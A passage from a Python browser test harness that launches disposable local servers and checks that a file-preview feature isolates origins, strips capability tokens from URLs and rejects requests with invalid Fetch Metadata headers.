  await openRecord("index.html", "html");
  await openRecord("handout.pdf", "pdf", false);
  checks.push("archive-to-viewer-markdown-image-html-pdf");

  return {ok: true, checks};
})()
"""


def _http_preview_expression(*, relay: bool = False) -> str:
    script = r"""
(async () => {
  const relay = __RELAY__;
  const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
  const until = async (label, check, timeout = 15000) => {
    const deadline = Date.now() + timeout;
    while (Date.now() < deadline) {
      const value = await check();
      if (value) return value;
      await wait(75);
    }
    throw new Error(`timed out waiting for ${label}`);
  };
  const archiveResponse = await fetch("/api/archive?project=canonical-browser");
  if (!archiveResponse.ok) {
    throw new Error(`HTTP preview Archive lookup failed: ${archiveResponse.status}`);
  }
  const archive = await archiveResponse.json();
  const record = archive.items.find(item => item.name === "index.html");
  if (!record?.target) {
    throw new Error("HTTP preview target is unavailable");
  }
  const encodePath = path =>
    path.split("/").filter(Boolean).map(encodeURIComponent).join("/");
  const target = record.target;
  const entry = (
    `/api/target-preview/${encodeURIComponent(target.project)}`
    + `/${encodeURIComponent(target.area.kind)}`
    + `/${target.area.id ?? "root"}`
    + `/${encodePath(target.path)}`
  );
  const messages = {};
  window.addEventListener("message", event => {
    if (typeof event.data?.probe === "string") {
      messages[event.data.probe] = event.data.value;
    }
  });
  const frame = document.createElement("iframe");
  frame.src = entry;
  document.body.append(frame);
  const origin = await until(
    relay ? "HTTP relay Area origin" : "HTTP named-local Area origin",
    () => messages["target-preview-origin"]
  );
  const validOrigin = relay
    ? origin.startsWith("http://127.0.0.1:") && origin !== location.origin
    : (
      origin.startsWith("http://file-")
      && origin.includes(".localhost")
      && origin !== location.origin
    );
  if (!validOrigin) {
    throw new Error(`invalid HTTP Area origin: ${origin}`);
  }
  window.__targetPreviewEntry = entry;
  window.__targetPreviewOrigin = origin;
  const cleanLocation = await until(
    "HTTP capability cleanup",
    () => messages["target-preview-clean-location"]
  );
  if (cleanLocation.includes("__proxima_cap")) {
    throw new Error("HTTP Area capability remained in the clean URL");
  }
  window.__targetPreviewCleanUrl = `${origin}${cleanLocation}`;
  for (const probe of [
    "target-preview-module",
    "target-preview-worker",
    "target-preview-fetch",
  ]) {
    const result = await until(`HTTP ${probe}`, () => messages[probe]);
    if (result !== "loaded") {
      throw new Error(`${probe} failed on HTTP Area origin: ${result}`);
    }
  }
  const sameSiteScript = await new Promise(resolve => {
    const script = document.createElement("script");
    const timer = setTimeout(() => resolve("timeout"), 3000);
    script.onload = () => {
      clearTimeout(timer);
      resolve("loaded");
    };
    script.onerror = () => {
      clearTimeout(timer);
      resolve("blocked");
    };
    script.src = `${origin}/site/module.js`;
    document.body.append(script);
  });
  if (sameSiteScript !== "blocked") {
    throw new Error(
      `same-site Area script request was not rejected: ${sameSiteScript}`
    );
  }
  return {
    ok: true,
    checks: relay ? [
      "http-relay-area-redirect",
      "http-relay-same-origin-resources",
      "http-relay-subresource-rejection",
    ] : [
      "http-localhost-area-bootstrap",
      "http-localhost-same-origin-resources",
      "http-localhost-subresource-rejection",
    ]
  };
})()
"""
    return script.replace("__RELAY__", "true" if relay else "false")


def _top_level_preview_probe(name: str) -> dict[str, object]:
    return {
        "action": "popup_response",
        "name": name,
        "timeout": 15,
        "url_expression": "window.__targetPreviewEntry",
        "expected_status": 403,
        "expected_final_origin_expression": "window.__targetPreviewOrigin",
        "expected_final_path": "/site/index.html",
        "expected_capability_query": True,
        "expected_executed": False,
        "expected_body": "preview request metadata is invalid",
    }


def _clean_top_level_preview_probe(name: str) -> dict[str, object]:
    return {
        "action": "popup_response",
        "name": name,
        "timeout": 15,
        "url_expression": "window.__targetPreviewCleanUrl",
        "request_headers": {
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Dest": "document",
        },
        "expected_status": 403,
        "expected_final_origin_expression": "window.__targetPreviewOrigin",
        "expected_final_path": "/site/index.html",
        "expected_capability_query": False,
        "expected_executed": False,
        "expected_body": "preview request metadata is invalid",
    }


def _resource_metadata_denial_probe(
    name: str,
    *,
    url_expression: str,
    path: str,
    mode: str,
    destination: str,
) -> dict[str, object]:
    return {
        "action": "popup_response",
        "name": name,
        "timeout": 15,
        "url_expression": url_expression,
        "request_headers": {
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": mode,
            "Sec-Fetch-Dest": destination,
        },
        "expected_status": 403,
        "expected_final_origin_expression": "window.__targetPreviewOrigin",
        "expected_final_path": path,
        "expected_capability_query": False,
        "expected_executed": False,
        "expected_body": "preview request metadata is invalid",
    }


def _browser_metadata_recording_probe() -> dict[str, object]:
    return {
        "action": "popup_response",
        "name": "HTTPS browser-emitted manifest and track metadata",
        "timeout": 15,
        "url_expression": (
            "window.__targetPreviewMetadataUrl"
            " + '?__proxima_fixture_frame=1'"
        ),
        "execution_marker": "__proximaTrackLoaded",
        "network_resource": {
            "url_expression": "window.__targetPreviewManifestUrl",
            "mime_type": "application/manifest+json",
            "body_json": {
                "name": "Canonical preview",
                "short_name": "Canonical",
                "start_url": "./index.html",
            },
            "fetch_metadata": {
                "site": "same-origin",
                "mode": "cors",
                "dest": "manifest",
            },
        },
        "expected_status": 200,
        "expected_final_origin_expression": "window.__targetPreviewOrigin",
        "expected_final_path": "/site/metadata.html",
        "expected_capability_query": False,
        "expected_executed": True,
        "expected_body": "TRACK RESOURCE LOADED",
    }


def _observed_resource_metadata(
    path: Path,
    manifest_resource: dict[str, object],
) -> dict[str, object]:
    records = []
    for line in path.read_text(encoding="utf-8").splitlines():
        prefix = "target-preview-admitted "
        if not line.startswith(prefix):
            continue
        value = json.loads(line[len(prefix) :])
        if isinstance(value, dict):
            records.append(value)
    expected = {
        "/site/app.webmanifest": ("same-origin", "cors", "manifest"),
        "/site/captions.vtt": ("same-origin", "same-origin", "track"),
    }
    observed: dict[str, dict[str, object]] = {}
    for resource_path, tuple_value in expected.items():
        matching = [
            record
            for record in records
            if record.get("path") == resource_path
        ]
        actual = {
            (
                record.get("site"),
                record.get("mode"),
                record.get("destination"),
            )
            for record in matching
        }
        if tuple_value not in actual:
            raise RuntimeError(
                f"{resource_path} emitted unexpected Fetch Metadata: "
                f"{sorted(actual, key=str)}"
            )
        if any(mode == "no-cors" for _site, mode, _destination in actual):
            raise RuntimeError(
                f"{resource_path} emitted an impossible no-cors request"
            )
        observed[resource_path] = {
            "destination": tuple_value[2],
            "mode": tuple_value[1],
            "site": tuple_value[0],
        }
    manifest_metadata = manifest_resource.get("fetch_metadata")
    manifest_request_id = manifest_resource.get("request_id")
    manifest_url = manifest_resource.get("url")
    if (
        not isinstance(manifest_request_id, str)
        or not manifest_request_id
        or not isinstance(manifest_url, str)
        or not manifest_url.split("?", 1)[0].endswith(
            "/site/app.webmanifest"
        )
        or manifest_metadata
        != {"site": "same-origin", "mode": "cors", "dest": "manifest"}
        or observed["/site/app.webmanifest"]
        != {"site": "same-origin", "mode": "cors", "destination": "manifest"}
    ):
        raise RuntimeError(
            "manifest network request and admission metadata do not correlate"
        )
    return {
        "name": "browser-emitted preview resource metadata",
        "manifest_request_id": manifest_request_id,
        "observed": observed,
        "ok": True,
    }


def _coop_success_probe(url: str) -> dict[str, object]:
    return {
        "action": "popup_response",
        "name": "COOP success response control",
        "timeout": 15,
        "url_expression": json.dumps(url),
        "expected_status": 200,
        "expected_capability_query": False,
        "expected_executed": True,
        "expected_body": "COOP EXECUTED",
    }


def main() -> None:
    if not API_PYTHON.is_file():
        raise RuntimeError(f"API Python is unavailable: {API_PYTHON}")
    browser_executable, openssl = _fixture_toolchain()
    _build_web()
    sys.path.insert(0, str(PROBE_ROOT))
    from browser import run_scenario

    with tempfile.TemporaryDirectory(prefix="proxima-file-target-browser-") as raw_root:
        fixture = Path(raw_root)
        home = fixture / "home"
        workspace = fixture / "workspace"
        canonical = workspace / "canonical"
        legacy = workspace / "legacy"
        runner_home = fixture / "runner-home"
        for path in (home, workspace, canonical, legacy, runner_home):
            path.mkdir(parents=True)
        port = _port()
        api_url = f"https://127.0.0.1:{port}"
        base_url = f"https://proxima.tailnet.test:{port}"
        certificate, private_key = _tls_certificate(fixture, openssl)
        tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        tls_context.check_hostname = False
        tls_context.verify_mode = ssl.CERT_NONE
        database = fixture / "candidate.db"
        preview_metadata_log = fixture / "preview-metadata.jsonl"
        environment = {
            "HOME": str(home),
            "LANG": "C.UTF-8",
            "PATH": "/usr/local/bin:/usr/bin:/bin",
            "PROXIMA_CLAUDE_LIVE_HOME": "0",
            "PROXIMA_APPS_DOMAIN": "preview.test",
            "PROXIMA_DB_PATH": str(database),
            "PROXIMA_FEATURE_MASTER_ORCHESTRATOR": "0",
            "PROXIMA_FEATURE_DESIGN_STUDIO": "1",
            "PROXIMA_FEATURE_SAFE_SELF_UPDATE": "0",
            "PROXIMA_HERMES_PROFILES_ROOT": str(runner_home),
            "PROXIMA_LINK_ROOTS": str(workspace),
            "PROXIMA_PORT": str(port),
            "PROXIMA_PREVIEW_METADATA_LOG": str(preview_metadata_log),
            "PROXIMA_PROJECTCTL_COMMAND": "/usr/bin/true",
            "PROXIMA_REFRESH_CREDENTIALS": "0",
            "PROXIMA_SINGLE_USER": "1",
            "PROXIMA_SINGLE_USER_NAME": "file-target-browser",
            "PROXIMA_UPDATE_CHECK": "0",
            "PROXIMA_WEB_DIST": str(WEB_DIR / "dist"),
            "PROXIMA_WORKSPACE_ROOT": str(workspace),
            "PYTHONPATH": str(ROOT / "apps" / "api"),
            "TMPDIR": str(fixture),
        }
        log_path = fixture / "server.log"
        with log_path.open("wb") as log:
            server = subprocess.Popen(
                [
                    str(API_PYTHON),
                    "-m",
                    "uvicorn",
                    "scripts.verify_file_targets_browser:_instrumented_app",
                    "--factory",
                    "--host",
                    "127.0.0.1",
                    "--port",
                    str(port),
                    "--ssl-certfile",
                    str(certificate),
                    "--ssl-keyfile",
                    str(private_key),
                ],
                cwd=ROOT,
                env=environment,
                stdin=subprocess.DEVNULL,
                stdout=log,
                stderr=subprocess.STDOUT,
                start_new_session=True,
            )
            try:
                deadline = time.monotonic() + 30
                while True:
                    if server.poll() is not None:
                        raise RuntimeError(log_path.read_text(encoding="utf-8"))
                    try:
                        _request(
                            f"{api_url}/api/health",
                            tls_context=tls_context,
                        )
                        break
                    except Exception:
                        if time.monotonic() >= deadline:
                            raise RuntimeError("disposable server readiness timed out")
                        time.sleep(0.1)
                token = str(
                    _request(
                        f"{api_url}/auth/set-password",
                        body={"password": PASSWORD},
                        tls_context=tls_context,
                    )["token"]
                )
                for path, name, slug in (
                    (legacy, "Legacy browser", "legacy-browser"),
                    (canonical, "Canonical browser", "canonical-browser"),
                ):
                    _request(
                        f"{api_url}/api/projects/link",
                        body={"name": name, "path": str(path), "slug": slug},
                        token=token,
                        tls_context=tls_context,
                    )
                _write_fixture_files(canonical)
                _seed_registry(database, canonical, legacy)
                http_database = fixture / "http-preview.db"
                with (
                    sqlite3.connect(database) as source_database,
                    sqlite3.connect(http_database) as target_database,
                ):
                    source_database.backup(target_database)
                evidence_dir_value = os.environ.get(
                    "PROXIMA_FILE_TARGET_SCREENSHOTS", ""
                ).strip()
                evidence_dir = (
                    Path(evidence_dir_value).expanduser().resolve()
                    if evidence_dir_value
                    else None
                )
                if evidence_dir is not None:
                    evidence_dir.mkdir(parents=True, exist_ok=True)
                with _coop_control_server(
                    certificate,
                    private_key,
                ) as coop_control_url:
                    scenario = {
                        "name": "canonical-file-targets",
                        "authenticated": True,
                        "steps": [
                            {
                                "action": "script",
                                "name": "canonical file identity browser flow",
                                "timeout": 45,
                                "expression": _browser_expression(),
                            },
                            _browser_metadata_recording_probe(),
                            _resource_metadata_denial_probe(
                                "HTTPS impossible no-cors manifest rejection",
                                url_expression=(
                                    "window.__targetPreviewManifestUrl"
                                ),
                                path="/site/app.webmanifest",
                                mode="no-cors",
                                destination="manifest",
                            ),
                            _resource_metadata_denial_probe(
                                "HTTPS impossible no-cors track rejection",
                                url_expression="window.__targetPreviewTrackUrl",
                                path="/site/captions.vtt",
                                mode="no-cors",
                                destination="track",
                            ),
                            _resource_metadata_denial_probe(
                                "HTTPS malformed manifest metadata rejection",
                                url_expression=(
                                    "window.__targetPreviewManifestUrl"
                                ),
                                path="/site/app.webmanifest",
                                mode="cors, no-cors",
                                destination="manifest",
                            ),
                            _top_level_preview_probe(
                                "HTTPS top-level Area navigation rejection"
                            ),
                            _clean_top_level_preview_probe(
                                "HTTPS clean top-level Area rejection"
                            ),
                            _coop_success_probe(coop_control_url),
                            *(
                                [
                                    {
                                        "action": "script",
                                        "name": "wait for PDF renderer",
                                        "timeout": 5,
                                        "expression": """
new Promise(resolve => setTimeout(() => resolve({ok: true}), 2000))
""",
                                    },
                                    {
                                        "action": "screenshot",
                                        "path": str(
                                            evidence_dir
                                            / "after-archive-ops-pdf.png"
                                        ),
                                    }
                                ]
                                if evidence_dir is not None
                                else []
                            ),
                        ],
                    }
                    transcript = run_scenario(
                        executable=browser_executable,
                        base_url=base_url,
                        scenario=scenario,
                        profile=fixture / "browser-profile",
                        auth_token=token,
                        drop_prefix=[],
                        host_resolver_rules=(
                            f"MAP *.preview.test:443 127.0.0.1:{port}, "
                            "MAP *.preview.test 127.0.0.1, "
                            "MAP proxima.tailnet.test 127.0.0.1, "
                            "MAP coop-control.test 127.0.0.1, "
                            "EXCLUDE 127.0.0.1"
                        ),
                        ignore_certificate_errors=True,
                    )
                transcript_value = json.loads(transcript)
                metadata_probe = next(
                    (
                        item
                        for item in transcript_value
                        if item.get("name")
                        == "HTTPS browser-emitted manifest and track metadata"
                    ),
                    None,
                )
                if (
                    not isinstance(metadata_probe, dict)
                    or not isinstance(
                        metadata_probe.get("network_resource"),
                        dict,
                    )
                ):
                    raise RuntimeError(
                        "manifest network observation is unavailable"
                    )
                transcript_value.append(
                    _observed_resource_metadata(
                        preview_metadata_log,
                        metadata_probe["network_resource"],
                    )
                )
                print(
                    json.dumps(
                        {
                            "fixture": "disposable",
                            "ok": True,
                            "scenario": scenario["name"],
                            "transcript": transcript_value,
                        },
                        sort_keys=True,
                    )
                )
                http_port = _port()
                http_environment = {
                    **environment,
                    "PROXIMA_DB_PATH": str(http_database),
                    "PROXIMA_PORT": str(http_port),
                }
                http_environment.pop("PROXIMA_APPS_DOMAIN", None)
                http_log_path = fixture / "http-server.log"
                with http_log_path.open("wb") as http_log:
                    http_server = subprocess.Popen(
                        [
                            str(API_PYTHON),
                            "-m",
                            "uvicorn",
                            "scripts.verify_file_targets_browser:_instrumented_app",
                            "--factory",
                            "--host",
                            "127.0.0.1",
                            "--port",
                            str(http_port),
                        ],
                        cwd=ROOT,
                        env=http_environment,
                        stdin=subprocess.DEVNULL,
                        stdout=http_log,
                        stderr=subprocess.STDOUT,
                        start_new_session=True,
                    )
                    try:
                        deadline = time.monotonic() + 30
                        while True:
                            if http_server.poll() is not None:
                                raise RuntimeError(
                                    http_log_path.read_text(
                                        encoding="utf-8",
                                    )
                                )
                            try:
                                _request(
                                    f"http://127.0.0.1:{http_port}/api/health"
                                )
                                break
                            except Exception:
                                if time.monotonic() >= deadline:
                                    raise RuntimeError(
                                        "HTTP preview server readiness timed out"
                                    )
                                time.sleep(0.1)
                        http_scenario = {
                            "name": "canonical-file-targets-http-localhost",
                            "authenticated": True,
                            "steps": [
                                {
                                    "action": "script",
                                    "name": "HTTP named-local preview flow",
                                    "timeout": 30,
                                    "expression": _http_preview_expression(),
                                },
                                _top_level_preview_probe(
                                    "HTTP named-local top-level rejection"
                                ),
                                _clean_top_level_preview_probe(
                                    "HTTP named-local clean top-level rejection"
                                ),
                            ],
                        }
                        http_transcript = run_scenario(
                            executable=browser_executable,
                            base_url=f"http://localhost:{http_port}",
                            scenario=http_scenario,
                            profile=fixture / "http-browser-profile",
                            auth_token=token,
                            drop_prefix=[],
                            host_resolver_rules=(
                                "MAP *.localhost 127.0.0.1, "
                                "EXCLUDE localhost, EXCLUDE 127.0.0.1"
                            ),
                        )
                        print(
                            json.dumps(
                                {
                                    "fixture": "disposable",
                                    "ok": True,
                                    "scenario": http_scenario["name"],
                                    "transcript": json.loads(http_transcript),
                                },
                                sort_keys=True,
                            )
                        )
                        relay_scenario = {
                            "name": "canonical-file-targets-http-relay",
                            "authenticated": True,
                            "steps": [
                                {
                                    "action": "script",
                                    "name": "HTTP Area relay preview flow",
                                    "timeout": 30,
                                    "expression": _http_preview_expression(
                                        relay=True,
                                    ),
                                },
                                _top_level_preview_probe(
                                    "HTTP relay top-level rejection"
                                ),
                                _clean_top_level_preview_probe(
                                    "HTTP relay clean top-level rejection"
                                ),
                            ],
                        }
                        relay_transcript = run_scenario(
                            executable=browser_executable,
                            base_url=f"http://127.0.0.1:{http_port}",
                            scenario=relay_scenario,
                            profile=fixture / "relay-browser-profile",
                            auth_token=token,
                            drop_prefix=[],
                        )
                        print(
                            json.dumps(
                                {
                                    "fixture": "disposable",
                                    "ok": True,
                                    "scenario": relay_scenario["name"],
                                    "transcript": json.loads(
                                        relay_transcript
                                    ),
                                },
                                sort_keys=True,
                            )
                        )
                    except Exception as exc:
                        raise RuntimeError(
                            f"{exc}\nHTTP disposable server log:\n"
                            f"{http_log_path.read_text(encoding='utf-8', errors='replace')}"
                        ) from exc
                    finally:
                        try:
                            os.killpg(http_server.pid, signal.SIGTERM)
                        except ProcessLookupError:
                            pass
                        if http_server.poll() is None:
                            try:
                                http_server.wait(timeout=10)
                            except subprocess.TimeoutExpired:
                                pass
                        try:
                            os.killpg(http_server.pid, signal.SIGKILL)
                        except ProcessLookupError:
                            pass
                        if http_server.poll() is None:
                            http_server.wait()
            except Exception as exc:
                raise RuntimeError(
                    f"{exc}\nDisposable server log:\n"
                    f"{log_path.read_text(encoding='utf-8', errors='replace')}"
                ) from exc
            finally:
                try:
                    os.killpg(server.pid, signal.SIGTERM)
                except ProcessLookupError:
                    pass
                if server.poll() is None:
                    try:
                        server.wait(timeout=10)
                    except subprocess.TimeoutExpired:
                        pass
                try:
                    os.killpg(server.pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
                if server.poll() is None:
                    server.wait()


if __name__ == "__main__":
    main()
